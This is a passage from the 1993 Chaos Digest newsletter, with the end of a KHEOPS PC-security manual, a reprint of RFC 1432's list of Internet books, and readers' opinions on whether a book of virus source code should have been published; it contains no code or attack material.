                           "Non system disk".

- Insert KHEOPS diskette into drive a:;
- Reset the PC so that it boots on the diskette;
- Type adminitrator id. and password.

The following message is then displayed:

                        "The system must be reset"

- Leave the diskette in drive a: and reboot.  Then, when prompted to, type
administrator id. and password.

                           The PC is unlocked.


5.  KHEOPS IMPLEMENTATION (Users)

Now that KHEOPS has been installed, your data on the PC's hard disk is
protected.

5.1. PC Reset

At boot time, the user is invited to type his id. and password.  Having
done that, he has free access to the resources of the PC.

5.2. Resident Program Activation

The function of the resident program is to lock up screen, if background
tasks are not authorized, and keyboard either due to temporization or upon
user request:

- Temporization: in case the PC has remained unused for 'n' minutes (as
set up by the administrator in the customization session, screen (if
background tasks are not authorized) and keyboard action is automatically
suspended.

KHEOPS displays the standard login window and invites the user to type his
id. and password.  If the same user logs in again, his application is
restaured.  In case another user attempts to connect himself then the PC
reboots.

- User request: the resident program can be deliberately activated by the
user by pressing the hot-key.

KHEOPS then displays the following message:

                      "End of session (Y/N) ?"

* By pressing the letter "Y" the user will ensure that the PC is
  automatically rebooted if another user logs in;

* The user answers "N".  This means that he wants to suspend his job
  temporarily.  KHEOPS displays the following message:

                         "Computer in use"

The only id/password acceptable are those of the user who pressed the hot-
key.  Any other user will be rejected.


6.  KHEOPS COMPATIBILITY

6.1.  Hardware

KHEOPS can be installed on IBM PC/AT, PS/2 or compatible micro-computers
running MS/DOS version 3.2 to 5.0.  DCSIS has tested this program on the
following computers: IBM PC/AT & PS/2, COMPAQ DeskPro (286S and 386S) and
LTE 286, SLT 286 and 386, EPSON EL2 and EL3S, GOUPIL G5 286, HP VECTRA 486,
OLIVETTI PC 310

6.2.  Software

6.2.1. Standard software

KHEOPS has been tested and validated by DCSIS with the following programs:
MICROSOFT C, TURBO C, TURBO PASCAL, PCTOOLS, NORTON, DBASE, LOTUS 1.2.3...

6.2.2. Graphic software

KHEOPS can handle mouse and keyboard, which ensures compatibility with the
following programs: WORD 4 and 5, WINDOWS 2 and 3, PAINTBRUSH, PAGE MAKER

6.2.3. Antivirus software

KHEOPS is compatible with VIRUSAFE+, trademark registered by Eliashim
Microcomputers, which has been recognized as one of the best antivirus
programs on the market (VIRUSAFE+ can handle 1400 virus and is wellknown
for its preventive and curative vocation).  The joint use of KHEOPS and
VIRUSAFE+ ensures maximum micro-computer safety.  Install Virusafe+ first
then KHEOPS (this is imperative).

6.2.4. Network

It is possible to install KHEOPS on every workstation of a local area
network (e.g. NOVELL network) so that every station is protected locally.

------------------------------

End of Chaos Digest #1.12
************************************

Chaos Digest               Lundi 8 Mars 1993          Volume 1 : Numero 13

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.13 (8 Mars 1993)
File 1--Nouveaux livres sur l'InterNet (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from cccf@altern.com. The editors may be contacted by
voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at: Jean-Bernard
Condat, Chaos Computer Club France [CCCF], B.P. 155, 93404 St-Ouen Cedex,
France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * ftp.eff.org (192.88.144.4) in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu (141.211.182.91) in /cud
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.cic.net (192.131.22.2) in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud
        * ftp.warwick.ac.uk in /pub/cud

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue Mar 16 11:31:00 CST 1993
From: millesjg@sluvca.slu.edu (Jim Milles )
Subject: File 1--Nouveaux livres sur l'InterNet (reprint)


Network Working Group                                     J. Quarterman
Request for Comments: 1432                                         MIDS
                                                             March 1993


                         Recent Internet Books

Status of this Memo

   This memo provides information for the Internet community.  It does
   not specify an Internet standard.  Distribution of this memo is
   unlimited.

Abstract

   This article originally appeared in Volume 2 Number 12, (December
   1992) of Matrix News, the monthly newsletter of Matrix Information
   and Directory Services, Inc. (MIDS).

1.  Which Books

   Here is a list of books related to using the Internet, which is the
   global and exponentially growing network of more than a million
   computers that communicate by interactive use of the TCP/IP
   protocols, for the use of millions of users.  This article was
   prompted by the recent publication of nine or ten books on the
   Internet in the space of a year (some are so new they aren't even
   published yet).  I have also included some books that have been
   around for quite a long time (as long ago as the dim past of 1984).
   I think all of them contain useful information for people new to the
   Internet.

   Some of the books included here are about more than the Internet.
   Some of them are about the Matrix, which is the set of all computer
   networks worldwide that exchange electronic mail.  The Matrix
   includes FidoNet, UUCP, BITNET, USENET, the Internet, and many
   others, but is not limited to any one of those networks.  This
   particular bibliographic collection is oriented around the largest
   computer network in the world, the Internet, because of all the
   recent books about that network.  Matrix News continues to publish
   information about the Matrix, including but not limited to the
   Internet.

   +++++++++++++++ +++ ++++++ ++++++++++++++ ++++++++++++++ +++++++++++
   Author          Pp. Price  Audience       Type           Other
                                                            Networks

   LaQuey & Ryer   208 $10.95 public         user guide     some
   Kehoe           112 $22    technical      user guide     minimal
   Krol            376 $24.95 researchers    guide, catalog minimal
   Kochmer         450 $39.95 researchers    guide, catalog some
   Marine, et al.  380 $39    administrative contacts,      some
                                             context
   Dern             ?    ?    new users      user guide     chapters
   Lane &          200 $37.50 information    primer         ?
   Summerhill                 professionals

   Malamud         376 $26.95 varied         travelog       some

   Quarterman &    448 $42.50 varied         standards      minimal
   Wilhelm
   Lynch, Rose     822 $40    technical      standards      minimal

   Tennant, et al. 142 $45    professionals  textbook       ?
   Benedikt        444 $15.95 varied         anthology      some
   Kahin           446 $34.95 faculty        scholarly      variable
   Parkhurst        86 $10.50 librarians     scholarly      some
   McClure, et al. 746 $45    varied         scholarly      some

   Levy            473  $4.95 public         history        some
   Raymond         453 $10.95 varied         dictionary     some
   Stoll           332 $19.95 public         spy story      some
   Hafner &        368 $22.95 public         journalism     some
   Markoff
   Denning         574 $23.95 public         scholarly      some
   Sterling        352 $23    public         documentary    some

   IRG             240 $15    technical      catalog        minimal
   NorthWestNet    297 $20    technical      catalog        minimal

   Frey & Adams    436 $26.95 varied         desk ref.      many
   LaQuey (UDCN)   645 $34.95 varied         directory      several
   Quarterman      746 $50    varied         context        all
   +++++++++++++++ +++ ++++++ ++++++++++++++ ++++++++++++++ +++++++++++

                     Table 1. Network Books Summarized


   I have excluded from this article books that are solely about
   technical aspects of technology, such as the TCP/IP protocols.
   Instead, I have included books about the resources and users of the
   Internet.  I have grouped them in rough classifications for
   convenience of presentation.  Several of these books fit several
   classifications.  For that reason and others, the classifications
   should be taken as illustrative, not definitive.  Table 1 summarizes
   some features of all the books described.

   Thanks to various people for input; especially David Bridge.  Much of
   the detailed bibliographic information came from the Library of
   Congress catalog server supported by Digital Research Associates,
   Inc., accessed via gopher and Telnet over the Internet.

   Please note that prices may change, as may electronic mail addresses,
   telephone and fax numbers, and postal addresses.  The price you pay,
   in particular, may be less because of a discount, or more because of
   shipping, or because you buy the book outside of the United States.
   The information included here is accurate to the best of my
   knowledge, but your mileage may vary.  Use at your own risk.  But
   please do report errors, changes, and additions to mids@tic.com.

   Some bibliographic citations end in a line of the form

                  domain.name:path/name

   This means you can retrieve further information by connecting to
   domain.name with FTP, logging in as user anonymous, using your
   electronic mail address as a password, and changing to path/name as a
   directory, or retrieving it as a file, whichever works.

   Some citations end in a line of the form

                  local@domain

   This is a domain address for further email inquiries.


2.  Introductions

   New user guides and information on getting connected fill most of the
   new books about the Internet.

      LaQuey & Ryer:

               Tracy LaQuey, and Jeanne C. Ryer, The Internet
               Companion: A Beginner's Guide to Global
               Networking, p. 208, Addison-Wesley, Reading, MA,
               October 1992.
               $10.95. ISBN 0-201-62224-6.
               Book Review: Internet Society News, 1(3):34.
               Summer 1992.
               Book Review: Link Letter, 5(3):4. Nov. 1992.
               Book Review: Matrix News, 2(9):8-9. Sept. 1992.
               companion@world.std.com

      This is the least expensive introductory guide for new users of
      the Internet, and perhaps the only one aimed at the general
      public.  It is also being made available online by anonymous FTP
      from world.std.com, two chapters a month.

      Kehoe:

               Brendan P. Kehoe, Zen and the Art of the Internet:
               A Beginner's Guide, p. 112, Prentice-Hall,
               Englewood Cliffs, NJ, July 1992.
               $22.00. ISBN 0-13-010778-6.
               Book Review: Link Letter, 5(3):3. Nov. 1992.
               Book Review: MicroTimes, 102:3, Nov. 23, 1992.
               simsc.si.edu:networks/zen.ad

      The first edition of this book was and is available only online,
      from various anonymous FTP servers.  This second edition is
      somewhat enlarged and updated, yet is still the shortest
      introductory Internet book.

      Krol:

               Ed Krol, The Whole Internet User's Guide &
               Catalog, p. 376, O'Reilly & Associates, Inc.,
               Sebastopol, CA, 13 September 1992.
               $24.95. ISBN 1-56592-025-2.
               Book Review: Internet Society News, 1(3):33.
               Summer 1992.
               Book Review: Link Letter, 5(3):3. Nov. 1992.
               Book Review: Matrix News, 2(11). Nov. 1992.
               Book Review: MicroTimes, 102:3, Nov. 23, 1992.

      Perhaps the most ambitious of the new crop of books, this one is
      both a user's guide and a catalog of resources in one.  It is
      aimed at graduate students who want to use the Internet for
      research.

      Kochmer:

               Jonathan Kochmer, and NorthWestNet, The Internet
               Passport: NorthWestNet's Guide to Our World
               Online, 4th ed., p. 450, NorthWestNet, Bellevue,
               WA, 1993.
               $39.95. ISBN 0-9635281-0-6.
               info@nwnet.net

      A forthcoming guide and catalog, not yet seen.  It is
      paradoxically both the fourth edition of and the successor to the
      other NorthWestNet book listed later.

      Marine:

               April Marine, ed., Internet: Getting Started, p.
               380, SRI International, Menlo Park, CA, September
               1992.
               $39.00.  ISBN [none].
               Book Review: Internet Society News, 1(3):33.
               Summer 1992.
               Book Review: Link Letter, 5(3):4. Nov. 1992.
               Book Review: Matrix News, 2(12). Dec. 1992.
               ftp.nisc.sri.com:netinfo/internet-getting-
               started-contents

      How to join the Internet, and some context so you will know why.
      This book is not a guide, and not a catalog, but it does contain
      numerous contact listings.

      Dern:

               Daniel P. Dern, The New User's Guide to the
               Internet, McGraw-Hill, New York, forthcoming in
               1993.  ISBN 0-07-016510-6 (hc). ISBN 0-07-16511-4
               (pbk).

      A forthcoming new user guide, not yet seen.

      Lane & Summerhill:

               Elizabeth S. Lane, and Craig A. Summerhill, An
               Internet Primer for Information Professionals: A
               Basic Guide to Networking Technology, p. 200,
               Meckler Corp., Westport, CT, forthcoming in 1992.
               $37.50. ISBN 0-88736-831-X.

      This book, not yet seen, is apparently aimed at information
      professionals, presumably meaning librarians and others.


3.  Travelogs

   This category has only one book in it so far.

      Malamud:

               Carl Malamud, Exploring the Internet: A Technical
               Travelogue, p. 376, Prentice-Hall, Englewood
               Cliffs, NJ, August 1992.
               $26.95. ISBN 0-13-296898-3.
               Book Review: Internet Society News, 1(3):34.
               Summer 1992.
               Book Review: Network Computing, 3(11):46. October
               15, 1992.
               Book Review: Matrix News, 2(9):9,11. Sept. 1992.

      Many fine lunches and dinners with users, administrators, and
      developers of the Internet in many countries around the world,
      with accurate technical background.  Certainly the most wickedly
      funny of all the books about the Internet.  Contains a subplot
      about how and why ITU and ISO do not publish their standards
      online.


4.  Standards

   The seemingly obscure topic of standards is actually illuminating
   when the subject is Internet Standards, because the processes that
   produce them reflect how the whole network works: by the efforts of
   its users and engineers.

      Quarterman & Wilhelm:

               John S. Quarterman, and Susanne Wilhelm, UNIX,
               POSIX, and Open Systems: The Open Standards
               Puzzle, p. 446, Addison-Wesley, Reading, MA, 1993.
               $42.50. ISBN 0-201-52772-3.
               Book Review: Internet Society News, 1(3):34.
               Summer 1992.

      Context about open systems standards.  Includes a very brief
      history of the Internet, comments on the effects of networks on
      standards and the reverse, commentary on the benefits of
      publishing standards online, and an in-depth examination of the
      IETF standards process used to produce Internet Standards.  Also
      includes an Internet growth graph.

      Lynch & Rose:

               Daniel C. Lynch and Marshall T. Rose, eds., The
               Internet System Handbook, p. 822, Addison-Wesley,
               Reading, MA, 1993.  $40, ISBN 0-201-56741-5.

      A description of the process that produces Internet Standards, and
      some other user level material in addition to protocol material.


5.  Textbooks

   This category includes a textbook on using the Internet, and some
   other books that could be used as textbooks for sociology or policy.

      Tennant:

               Roy Tennant, John Ober, Anne G. Lipow, and
               Foreword by Clifford Lynch, Crossing the Internet
               Threshold: an Instructional Handbook, p. 142
               pages, 1993.
               $45.00. ISBN 1-882208-01-3.
               simsc.si.edu:networks/crossing.ad

      A short textbook on using the Internet, by two librarians at the
      University of California at Berkeley.

      Benedikt:

               Michael Benedikt, ed., Cyberspace: First Steps, p.
               444, MIT Press, Cambridge, MA, 1991.  $15.95. ISBN
               0-262-02327-X.

      An anthology of sociological examinations of networks and related
      topics, by writers, scholars, and public figures.  Edited by a
      professor of Architecture at the University of Texas.

      Kahin:

               Brian Kahin, ed., Building Information
               Infrastructure: Issues in the Development of the
               National Research and Education Network, p. 446,
               McGraw-Hill Primis, New York, 1992.
               $34.95, ISBN: 0-390-03083-X.
               Book Review: Matrix News, 2(5). May 1992.

      Includes the entire text of the High Performance Computing Act
      (HPCA) of 1991 that authorized the forthcoming National Research
      and Education Network (NREN), as well as numerous examinations of
      what it does and should mean.  Papers from a workshop at Harvard's
      Kennedy School of Government.  Tough sledding in spots, but very
      rewarding in others.

      Parkhurst:

               Carol A. Parkhurst, ed., Library Perspectives on
               NREN: The National Research and Education Network,
               p. 86, LITA, Chicago, 1990.
               $10.50. ISBN 0-8389-7477-5.
               Book Review: Matrix News, 1(7). Oct. 1991.

      Another NREN policy anthology; this one oriented towards library
      uses.

      McClure:

               Charles McClure, Ann Bishop, Philip Doty, and
               Howard Rosenbaum, The National Research And
               Education Network (NREN): Research and Policy
               Perspectives, p. 746, Ablex Press, Norwood, NJ,
               1991.
               $45 personal; $95 institutional. ISBN
               0-89391-813-X. Book Review: Matrix News, 1(6).
               Sep. 1991.
               Book Review: Electronic Networking: Research,
               Applications and Policy 2(1). Spring 1992.

      Masses of information on NREN, and examination of its potential
      effects on research.


6.  Hacking and Cracking

   Hacking is skillful programming.  Cracking is breaking and entering.
   If you don't know the difference, read the first two books below.  If
   you don't think it matters, read the last book below, which examines
   how law enforcement agencies confused about computers and networks
   did some very strange things.

      Levy:

               Steven Levy, Hackers: Heroes of the Computer
               Revolution, p. 473, Anchor Press/Doubleday, Garden
               City, NY, 1984.  $17.95. ISBN 0-385-19195-2 (hc).
               $4.95 ISBN 0-440-13405-6 (pbk).

      Tales of the real hackers who invented the modern computer
      industry.  Some of these people are still quite active on the nets
      today.

      Raymond & Steele:

               Eric S. Raymond, ed., Guy Steele, The New Hacker's
               Dictionary, p. 453, MIT Press, Cambridge, MA,
               1991.  ISBN 0-262-18145-2 (hc). $10.95 ISBN
               0-262-68069-6 (pbk).

      The authority on hacker jargon, and a very amusing book.  Look it
      up in here when you doubt a definition in the press.

      Stoll:

               Clifford Stoll, The Cuckoo's Egg: Tracking a Spy
               Through the Maze of Computer Espionage, p. 332,
               Doubleday, New York, 1989.  $19.95. ISBN
               0-385-24946-2 (alk. paper).

      A spy novel, except it's true: a first person account by a down-
      on-his-luck Berkeley astronomer who with others tracked down a KGB
      network spy.  Despite its necessary concentration on cracking,
      still a readable introduction to what the Internet is about.

      Hafner & Markoff:

               Katie Hafner, and John Markoff, Cyberpunk, p. 368,
               Simon & Schuster, New York, 1991.  $22.95. ISBN
               0-671-68322-5.

      Interviews with some of the crackers who have appeared
      conspicuously in the press in the past few years.  One of the co-
      authors is the New York Times reporter who broke the Stoll story
      to the public.

      Denning:

               Peter J. Denning, ed., Computers Under Attack:
               Intruders, Worms, and Viruses, p. 574, ACM
               Press/Addison-Wesley, Reading, MA, 1990.  $23.95,
               ISBN 0-201-53067-8.

      Details of celebrated network security cases, including those
      described in the previous two books.  Includes Stoll's original
      article about the Wiley Hacker, and responses and articles by
      others on the same subject.  Has extensive coverage of the 1988
      Internet Worm.  Also includes information on viruses.  Has quite a
      bit of material on the cultures of the networks, and on social,
      legal, and ethical matters.  Starts with the standard historical
      network papers, including "Notable Computer Networks" by
      Quarterman and Hoskins.

      Sterling:

               Bruce Sterling, The Hacker Crackdown: Law and
               Disorder on the electronic frontier, p. 352,
               Bantam, New York, 1992.  $23. ISBN 0-553-08058-X.

      An in-depth examination of the forces of law who try to deal with
      computer crime, and of the issues involved, written by one of the
      science fiction writers who invented cyberpunk.  The real story
      behind Operation Sundevil and the Legion of Doom.  Readable,
      informative, amusing, and necessary.


7.  Resource Guides

   These have always been available online.

      NorthWestNet:

               NorthWestNet, NorthWestNet User Services Internet
               Resource Guide, p. 297, NorthWestNet, Bellevue,
               WA, 1992.
               $20.  ISBN [none]. Book Review: Matrix News, 2(1).
               Jan. 1992.
               ftphost.nwnet.net:nic/nwnet/user-
               guide/README.nusirg

          NorthWestNet's Resource Guide.

      IRG:

               NNSC, Internet Resource Guide, p. 240, NSF Network
               Service Center (NNSC), BBN, Cambridge, MA, 1991.
               $15. ISBN [none].
               nnsc.nsf.net:resource-guide/README.

      The original Internet Resource Guide.


8.  Also About Other Networks

   The network service most people use is electronic mail, which is
   carried over many networks other than the Internet, throughout the
   worldwide Matrix of interconnected computer networks that exchange
   mail.  These are books about networks that cover more networks than
   the Internet alone.

      Frey & Adams:

               Donnalyn Frey, and Rick Adams, !%@: A Directory of
               Electronic Mail Addressing and Networks, p. 436,
               O'Reilly & Associates, Sebastopol, CA, January
               1991.  $26.95. ISBN 0-937-17515-3 (pbk.).

      A quick desk reference to many networks, with two pages on each
      one.

      LaQuey (UDCN):

               Tracy Lynn LaQuey, Users' Directory of Computer
               Networks, p. 645, Digital Press, Bedford, MA,
               1989.  $34.95 Digital Part Number EY-C200E-DP;
               Digital Press ISBN 1-555-58047-5; Prentice-Hall
               ISBN 0-13-950262-9.

      A directory of users, domains, etc. of the Internet, BITNET, UUCP,
      etc.

      Quarterman:

               John S. Quarterman, The Matrix: Computer Networks
               and Conferencing Systems Worldwide, p. 746,
               Digital Press, Bedford, MA, 1990.  $50. Digital
               order number EY-C176E-DP-SS, Digital Press ISBN
               155558-033-5, Prentice-Hall ISBN 0-13-565607-9.

      A context book about all computer networks worldwide, including
      UUCP, FidoNet, BITNET, USENET, and the Internet.  The longest of
      all the books listed, and the most comprehensive.


9.  Publishers

   These are in alphabetical order.  Most of the telephone and fax
   numbers are only for orders, not for other kinds of communications.

          Ablex Publishing Corp.          Doubleday, a division of
          201-767-8450                    Bantam Doubleday Dell
          fax: 201-767-6717                  Publishing Group, Inc.
          355 Chestnut St.                212-765-6500
          Norwood, NJ 07648               800-223-6834
                                          fax: 212-765-3869
                                          666 Fifth Avenue
          Addison-Wesley Publishing Co.   New York, NY  10103
          74230.3622@CompuServe.com
          617-944-3700
          800-447-2226                    Library Solution Press
          1 Jacob Way                     510-841-2636
          Reading, MA 01867               fax: 415-594-0411
                                          1100 Industrial Road, Suite 9
                                          San Carlos, CA 94070
          Bantam, a division of
          Bantam Doubleday Dell
             Publishing Group Inc.        LITA Publications
          212-765-6500                    ALANET ALA0085
          800-223-6834                    800-545-2433
          fax: 212-765-3869               312-280-4270
          666 Fifth Avenue                fax: + 312-440-9374
          New York, NY  10103             50 East Huron Street
                                          Chicago, IL  60602

          Digital Press
          buddenhagen@cecv01.enet.dec.com McGraw-Hill
          617-276-1498                    212-512-2000
          fax: 617-276-4314               1221 Ave. of the Americas
          Digital Equipment Corporation   New York, NY 10020
          12 Crosby Drive BUO/E94
          Bedford, MA 01730


          Meckler Corporation             Simon & Schuster
          (203) 226-6967                  212-698-7000
          Fax: (203) 545-5840             800-223-2336
          11 Ferry Lane West              fax: 212-698-7007
          Westport, CT 06880              Subsidiary of
                                          Paramount Communications Inc.
                                          the Simon & Schuster Bldg.
                                          1230 Ave. of the Americas
                                          New York, NY  10020

                                          SRI International
          MIT Press                       nisc@nisc.sri.com
          Massachusetts Institute         415-859-6387
             of Technology                415-859-6387
          Cambridge, MA  02142            fax: 415-859-6028
                                          Network Information Systems
          NorthWestNet                    Center
          nusirg-orders@nwnet.net         333 Ravenswood Avenue,
          206-562-3000                    Room EJ29
          fax: 206-562-4822               Menlo Park, CA 9402

          NUSIRG Orders
          15400 SE 30th Place, Suite 202
          Bellevue, WA  98007

          NSFNET Network Service Center
          nnsc@nnsc.nsf.net
          617-873-3400
          Bolt Beranek and Newman Inc.
          10 Moulton Street
          Cambridge, MA  02138

          O'Reilly & Associates, Inc.
          nuts@ora.com
          707-829-0515
          800-998-9938  7am to 5pm PST
          fax: 707-829-0104
          103 Morris Street, Suite A
          Sebastopol, CA 95472

          Prentice-Hall
          info@prenhall.com
          515-284-6751
          fax: 515-284-2607
          Route 9W
          Englewood Cliffs, NJ 07632

Security Considerations

   Security issues are not discussed in this memo.


Author's Address

   John S. Quarterman
   Matrix Information and Directory Services, Inc. (MIDS)
   1106 Clayton Lane, Suite 500W
   Austin, TX 78723
   U.S.A.

   EMail: jsq@tic.com
   Phone: +1-512-451-7602
   Fax: +1-512-450-1436


   For further information on MIDS, contact:

   Matrix News
   Matrix Information & Directory Services, Inc. (MIDS)
   1106 Clayton Lane, Suite 500W
   Austin, TX 78723
   U.S.A.

   EMail: mids@tic.com
   Phone: +1-512-451-7602
   Fax: +1-512-450-1436

------------------------------

End of Chaos Digest #1.13
************************************

Chaos Digest               Lundi 15 Mars 1993          Volume 1 : Numero 14

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.14 (15 Mars 1993)
File 1--Reactions sur "C'est decide! J'ecris mon virus" (Re: #1.01)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from cccf@altern.com. The editors may be contacted by
voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at: Jean-Bernard
Condat, Chaos Computer Club France [CCCF], B.P. 155, 93404 St-Ouen Cedex,
France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org (192.88.144.4) in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu (141.211.182.91) in /pub/CuD/chaos
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.cic.net (192.131.22.2) in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud
        * ftp.warwick.ac.uk in /pub/cud

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:
CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue Feb 23 20:06:14 CST 1993
From: ymcrabbe@altern.com (Yves-Marie Crabbe )
Subject: File 1--Reactions sur "C'est decide! J'ecris mon virus" (Re: #1.01)


                       PROHIBITION ON THE RELEASES

Date: Thu Oct 22 14:02:46 EDT 1992
From: seborg@first.org (Brian Seborg )

While I do not believe it should be legal to release viruses into the public
and that severe penalties should be leveled at anyone guilty of doing this,
I do not see much harm in making available to the public information which
the computer underground has had for some time.  The only risk is that books
such as these decrease the inherent "cost" and time that a virus writer must
normally spend in order to obtain sufficient information and expertise to
enable him/her to write viruses.  In the past, this "cost" has acted as a
barrier of entry for most virus writers.  If higher quality information is
presented in a concise form, then the danger is that there will be more people
able to write viruses than before.  In addition, if you provide people with
source code for viruses, then they can learn from the mistakes and successes
of these viruses and come up with more sophisticated viruses.  This is
dangerous if no prohibition on the release of these viruses into the public
is enacted.  The English language version of the book is already in print,
I see little additional harm comming from a French translation.  The damage
has already been done.

Brian Seborg
VDS Advanced Research Group


                     McAFEE, HOFF & HOFFMAN ARE BAD

Date: Wed Oct 14 11:47:27 GMT 1992
From: bontchev@informatik.uni-hamburg.de (Vesselin Bontchev )

Hi!

Ah, yes, McAfee is master of the media shows... :-\ He does this much
better than fighting viruses... :-( The only thing that he does even
better is making money... :-)

Umm, I have here "Les virus. Methodes et techniques de securite" by
Jean-Claude Hoff... There are so many mistakes in his book... He
reminds me Patricia Hoffman. Probably has the same level of knowledge
about viruses... :-)

[...]  Well, I have to admit that their package contains a really good
integrity checker... The best one I have ever seen. But what they are
saying - that it's the absolute weapon against viruses, is of course
not true. I can think of a couple of attacks that can be used by a
virus to slip through their protection... There's no such thing as
absolute protection against viruses, unless you decide to make your
computer unusable...

:-). Well, the last time I've seen their ads, it was "l'arme absolue
contre les virus"... :-) Having in mind how bad most virus protection
schemes are, theirs is indeed incredibly good. And having in mind how
difficult for the user is to use an integrity checker at all, theirs
is indded very easy to use...

Regards,
Vesselin
--
Vesselin Vladimirov Bontchev          Virus Test Center, University of Hamburg
Tel.:+49-40-54715-224, Fax: +49-40-54715-226      Fachbereich Informatik - AGN
PGP 2.0 public key available on request.   > Vogt-Koelln-Strasse 30, rm. 107 C
e-mail: bontchev@fbihh.informatik.uni-hamburg.de    D-2000 Hamburg 54, Germany


                      ONLY IDIOTS COMPILE VIRUS CODES

Date: Thu Oct 22 11:02:53 PDT 1992
From: sbonds@jarthur.Claremont.EDU (007 )

This is correct, the fact that "Stoned", a boot sector virus, remains the
most common MS-DOS virus shows that most viruses are transferred between
friends/coworkers by disk exchange.  However, the reason MS-DOS viruses are
not more commonly spread through networks is not because of the number of
"steps" needed, but rather because MS-DOS viruses cannot function except on
MS-DOS machines.  Putting a MS-DOS virus on a UNIX machine renders it
useless, until it gets transferred to a MS-DOS machine again.  (Which it
will be unable to do on its own.)

I would even go so far as to say that MOST are not deliberately destructive.

This is true.  New viruses are rather rare in the wild, in part due to the
efforts of those who provide antivirus software.  In all my experience with
viruses, I have only seen ONE new virus in the wild.  I have seen many, many
people without any sort of virus protection come to me after the virus has
made its presence known asking for help.  Often it's too late then.

Even a feeble program like SCAN is better than nothing.

Fears that people with source code will somehow magically create whole new
viruses are, IMHO, unfounded.  If a person knows enough about DOS and
assembly to be able to interpret the code, then they also know enough to
create an entirely new virus.  The worst that could happen is that some
idiot could compile the code, run it, and infect himself.  This is a great
way to learn first-hand what viruses can do.  

Sofar as I know there is no US law forbidding this either, and there can't
be.  (That Bill of Rights is useful at times... )  However, the "moral
majority" often gets its way on issues like this.


                         VIRUS-FIGHTING FOUNDATION

Date: Thu Oct 22 15:57:58 EDT 1992
From: Kevin_Haney@CU.NIH.GOV

Since you asked twice, I will tell you what I think.  My opinion is that
the book should not be published.  I believe it is a completely self-
serving and money-making scheme.  If you put a "Forbidden" label on a
product, that will only make people want to buy it more.  The author's
claim that you can't be a real computer security person if you haven't
seen the source code of a live virus is bullshit.   The publishing of
viral source code is a very irresponsible act, however you attempt to
justify it.  At the IVPC conference last year, David Stang challenged
the book author to donate all of the proceeds to a virus-fighting
foundation if his motive was really to help computer security
professionals.  He declined.


                        I BEGIN BANNING BOOKS

Date: Tue Oct 27 09:52:57 CET 1992
From: lschumac@mainz-emh2.army.mil ("Ludwig (Lu) Schumacher ->" )

I would prefer NOT to see this book on the market.  It makes it too easy
for those who might not otherwise have the requisite knowledge to start
playing games.  While these virus's should be easily recognized by most
of the Anti-Virus programs, not everyone has (or regularly uses) one.
Further, once 'trained', it becomes easier to develop more malicious
programs.

Having said all that, I will add that we would tread on very thin ice
should we ever begin banning books.


                    DO-IT-YOURSELF PACKAGE & TWIT

Date: Wed Oct 28 08:53:30 -0700 1992
From: martin@cs.ualberta.ca ("Tim Martin; FSO; Soil Sciences" )

Well, I haven't seen Kephart's study, so I can't comment on whether this
is a legitimate summary of it.  In my limited experience I would agree
that networks are rarely a factor in virus spread.  And by far the
majority of viruses I have seen or had good descriptions of are
poorly written, usually simple stupid modifications of a few common
viruses.  Almost all virus writers work alone.  They have found a virus,
disassemble it and try to make "improvements" on it.  The few writers
who are members of virus writing clubs, or are connected by InterNet,
FidoNet, or VxNET have little impact on the "virus problem" as
experienced by the end-user.

I don't quite follow what knowledge CCCF is reputedly advancing: the fact
that viruses are by and large poorly written and ineffective?  Or is this
saying CCCF is trying to encourage more "quality" in viruses?  Given I
don't know what Schmidt is arguing, nor why CCCF is publishing the (rather
poor) book, I can hardly comment.

No doubt these are all facts.  The book does have virus code.  The viruses
are easily defeated.  I don't know French law, and of course the warning
about responsible adults and 18 years old is present, but it is utter
nonsense, an attempt by Ludwig to cover his ass.

I'm not sure whether you want my thoughts on publishing such a book.
Personally I feel that the best way to stop the virus problem would
be for the average user to understand how viruses work.  So I work
hard to educate people on how viruses really work, at the technical
level.  However I don't publish virus code, because as soon as one
has virus code, one no longer needs to understand how viruses work
